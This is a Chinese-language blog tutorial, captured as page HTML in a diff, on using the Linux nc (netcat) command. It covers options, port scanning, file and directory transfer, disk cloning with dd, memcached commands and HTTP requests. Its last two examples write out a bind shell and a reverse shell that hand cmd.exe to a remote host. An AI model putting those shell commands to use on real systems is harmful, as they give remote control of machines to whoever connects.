@@ -1,0 +1,974 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.3.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.3.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    save_scroll: false,
+    copycode: {"enable":true,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="功能说明：功能强大的网络工具 语　法：nc[-hlnruz][-g&amp;lt;网关...&amp;gt;][-G&amp;lt;指向器数目&amp;gt;][-i&amp;lt;延迟秒数&amp;gt;][-o&amp;lt;输出文件&amp;gt;][-p&amp;lt;通信端口&amp;gt;][-s&amp;lt;来源位址&amp;gt;][-v...][-w&amp;lt;超时秒数&amp;gt;][主机名称][通信端口...] 参　数： -g&amp;lt;网关&amp;gt; 设置路由器跃程通信网关，最丢哦">
+<meta name="keywords" content="linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Linux】nc命令使用详解">
+<meta property="og:url" content="http://www.iteedu.com/blog/os/linux/cmd/nc/index.html">
+<meta property="og:site_name" content="ITEEDU">
+<meta property="og:description" content="功能说明：功能强大的网络工具 语　法：nc[-hlnruz][-g&amp;lt;网关...&amp;gt;][-G&amp;lt;指向器数目&amp;gt;][-i&amp;lt;延迟秒数&amp;gt;][-o&amp;lt;输出文件&amp;gt;][-p&amp;lt;通信端口&amp;gt;][-s&amp;lt;来源位址&amp;gt;][-v...][-w&amp;lt;超时秒数&amp;gt;][主机名称][通信端口...] 参　数： -g&amp;lt;网关&amp;gt; 设置路由器跃程通信网关，最丢哦">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-07-09T14:18:31.374Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【Linux】nc命令使用详解">
+<meta name="twitter:description" content="功能说明：功能强大的网络工具 语　法：nc[-hlnruz][-g&amp;lt;网关...&amp;gt;][-G&amp;lt;指向器数目&amp;gt;][-i&amp;lt;延迟秒数&amp;gt;][-o&amp;lt;输出文件&amp;gt;][-p&amp;lt;通信端口&amp;gt;][-s&amp;lt;来源位址&amp;gt;][-v...][-w&amp;lt;超时秒数&amp;gt;][主机名称][通信端口...] 参　数： -g&amp;lt;网关&amp;gt; 设置路由器跃程通信网关，最丢哦">
+  <link rel="canonical" href="http://www.iteedu.com/blog/os/linux/cmd/nc/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>【Linux】nc命令使用详解 | ITEEDU</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?a5213b08a76d4fc6b8a80eb382490e0b";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ITEEDU</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">编程学习网</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-oldsite">
+      
+    
+
+    <a href="http://site.iteedu.com" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>旧站归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+      </li>
+    
+  </ul>
+
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content page-post-detail">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.iteedu.com/blog/os/linux/cmd/nc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="证心">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ITEEDU">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">【Linux】nc命令使用详解
+
+            
+          </h1>
+        
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2015-09-17 17:39:35" itemprop="dateCreated datePublished" datetime="2015-09-17T17:39:35+08:00">2015-09-17</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-07-09 22:18:31" itemprop="dateModified" datetime="2019-07-09T22:18:31+08:00">2019-07-09</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/操作系统/" itemprop="url" rel="index"><span itemprop="name">操作系统</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/操作系统/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>功能说明：功能强大的网络工具</p>
+<p>语　法：nc<br>[-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</p>
+<p>参　数：</p>
+<p>-g&lt;网关&gt; 设置路由器跃程通信网关，最丢哦可设置8个。</p>
+<p>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</p>
+<p>-h  在线帮助。</p>
+<p>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</p>
+<p>-l  使用监听模式，管控传入的资料。</p>
+<p>-n  直接使用IP地址，而不通过域名服务器。</p>
+<p>-o&lt;输出文件&gt;<br>指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</p>
+<p>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</p>
+<p>-r  乱数指定本地与远端主机的通信端口。</p>
+<p>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</p>
+<p>-u  使用UDP传输协议。</p>
+<p>-v 详细输出--用两个-v可得到更详细的内容</p>
+<p>-w&lt;超时秒数&gt; 设置等待连线的时间。</p>
+<p>  -z  使用0输入/输出模式，只在扫描通信端口时使用。</p>
+<p>nc使用示例</p>
+<p>1. 端口扫描</p>
+<p># nc -v -w 2 192.168.2.34 -z 21-24</p>
+<p>nc: connect to 192.168.2.34 port 21 (tcp) failed: Connection refused</p>
+<p>Connection to 192.168.2.34 22 port [tcp/ssh] succeeded!</p>
+<p>nc: connect to 192.168.2.34 port 23 (tcp) failed: Connection refused</p>
+<p>nc: connect to 192.168.2.34 port 24 (tcp) failed: Connection refused</p>
+<p>2. 从192.168.2.33拷贝文件到192.168.2.34</p>
+<p>在192.168.2.34上： nc -l 1234 &gt; test.txt</p>
+<p>在192.168.2.33上： nc 192.168.2.34 &lt; test.txt</p>
+<p>3. 简单聊天工具</p>
+<p>在192.168.2.34上： nc -l 1234</p>
+<p>在192.168.2.33上： nc 192.168.2.34 1234</p>
+<p>这样，双方就可以相互交流了。使用ctrl+C(或D）退出。</p>
+<p>4. 用nc命令操作memcached</p>
+<p>1）存储数据：printf”set key 0 10 6rnresultrn” |nc 192.168.2.34 11211</p>
+<p>2）获取数据：printf”get keyrn” |nc 192.168.2.34 11211</p>
+<p>3）删除数据：printf”delete keyrn” |nc 192.168.2.34 11211</p>
+<p>4）查看状态：printf”statsrn” |nc 192.168.2.34 11211</p>
+<p>5）模拟top命令查看状态：watch”echo stats” |nc 192.168.2.34 11211</p>
+<p>6）清空缓存：printf”flush_allrn” |nc 192.168.2.34 11211<br>(小心操作，清空了缓存就没了）</p>
+<p>5. nc -p 1234 -w 5 host.example.com 80</p>
+<p>建立从本地1234端口到host.example.com的80端口连接，5秒超时</p>
+<p>nc -u host.example.com 53</p>
+<p>u为UDP连接</p>
+<p>6. echo -n &quot;GET / HTTP/1.0&quot;r&quot;n&quot;r&quot;n&quot; | nc host.example.com 80</p>
+<p>连接到主机并执行</p>
+<p>7. nc -v -z host.example.com 70-80</p>
+<p>扫描端口(70到80)，可指定范围。-v输出详细信息。</p>
+<p>8. 远程拷贝文件</p>
+<p>从server1拷贝文件到server2上。需要先在server2上，用nc激活监听，</p>
+<p>server2上运行：</p>
+<p>root@hatest2 tmp]# nc -lp 1234 &gt; install.log</p>
+<p>server1上运行：</p>
+<p>[root@hatest1 ~]# ll install.log</p>
+<p>-rw-r–r–  1 root root 39693 12月 20  2007 install.log</p>
+<p>[root@hatest1 ~]# nc -w 1 192.168.228.222 1234 &lt; install.log</p>
+<p>9. 克隆硬盘或分区</p>
+<p>操作与上面的拷贝是雷同的，只需要由dd获得硬盘或分区的数据，然后传输即可。</p>
+<p>克隆硬盘或分区的操作，不应在已经mount的的系统上进行。所以，需要使用安装光盘引导后，进入拯救模式（或使用Knoppix工具光盘）启动系统后，在server2上进行类似的监听动作：</p>
+<p># nc -l -p 1234 | dd of=/dev/sda</p>
+<p>server1上执行传输，即可完成从server1克隆sda硬盘到server2的任务：</p>
+<p># dd if=/dev/sda | nc 192.168.228.222 1234</p>
+<p>※完成上述工作的前提，是需要落实光盘的拯救模式支持服务器上的网卡，并正确配置IP。</p>
+<p>10. 保存Web页面</p>
+<p># while true; do nc -l -p 80 -q 1 &lt; somepage.html; done</p>
+<p>11. 模拟HTTP Headers,获取网页源代码和返回头部信息</p>
+<p>[root@hatest1 ~]# nc 80</p>
+<p>GET / HTTP/1.1</p>
+<p>Host: ispconfig.org</p>
+<p>Referrer: mypage.com</p>
+<p>User-Agent: my-browser</p>
+<p>HTTP/1.1 200 OK</p>
+<p>Date: Tue, 16 Dec 2008 07:23:24 GMT</p>
+<p>Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8<br>Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8</p>
+<p>Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/</p>
+<p>Expires: 0</p>
+<p>Cache-Control: no-store, no-cache, must-revalidate, post-check=0,<br>pre-check=0</p>
+<p>Pragma: no-cache</p>
+<p>Cache-Control: private, post-check=0, pre-check=0, max-age=0</p>
+<p>Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT;<br>path=/</p>
+<p>Vary: Accept-Encoding</p>
+<p>Transfer-Encoding: chunked</p>
+<p>Content-Type: text/html</p>
+<p>[......]</p>
+<p>在nc命令后，输入红色部分的内容，然后按两次回车，即可从对方获得HTTP<br>Headers内容。</p>
+<p>12. 传输目录</p>
+<p>从server1拷贝nginx-0.6.34目录内容到server2上。需要先在server2上，用nc激活监听，server2上运行：</p>
+<p>引用</p>
+<p>[root@hatest2 tmp]# nc -l 1234 |tar xzvf -</p>
+<p>server1上运行：</p>
+<p>引用</p>
+<p>[root@hatest1 ~]# ll -d nginx-0.6.34</p>
+<p>drwxr-xr-x 8 1000 1000 4096 12-23 17:25 nginx-0.6.34</p>
+<p>[root@hatest1 ~]# tar czvf – nginx-0.6.34|nc 192.168.228.222 1234</p>
+<p>13.REMOTE主机绑定SHELL</p>
+<p>例子：</p>
+<p>格式：nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe</p>
+<p>讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口</p>
+<p>14.REMOTE主机绑定SHELL并反向连接</p>
+<p>例子：</p>
+<p>格式：nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354</p>
+<p>讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口</p>
+<p>以上为最基本的几种用法（其实NC的用法还有很多，</p>
+<p>当配合管道命令&quot;|&quot;与重定向命令&quot;&lt;&quot;、&quot;&gt;&quot;等等命令功能更强大......）。</p>
+
+    </div>
+
+    
+    
+    
+    
+      <div>
+        <div id="reward-container">
+  <div></div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+        
+      
+      <div style="display: inline-block">
+        <img src="/uploads/wechatpay.png" alt="证心 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/linux/" rel="tag"># linux</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/blog/database/sql/selectinto/" rel="next" title="SELECT INTO 和 INSERT INTO SELECT 两种表复制语句">
+                <i class="fa fa-chevron-left"></i> SELECT INTO 和 INSERT INTO SELECT 两种表复制语句
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/blog/tools/vs/vsbbjj/" rel="prev" title="Visual Studio版本简述">
+                Visual Studio版本简述 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">证心</p>
+  <div class="site-description motion-element" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">363</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">45</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">77</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/douzh" title="GitHub &rarr; https://github.com/douzh" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="http://weibo.com/douzh1988" title="微博 &rarr; http://weibo.com/douzh1988" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>微博</a>
+      </span>
+    
+  </div>
+
+
+
+        </div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">  <a href="http://www.beian.miit.gov.cn" rel="noopener" target="_blank">京ICP备16069454号 </a>&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">证心</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+      </div>
+
+    
+
+  </div>
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+<script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+</body>
+</html>
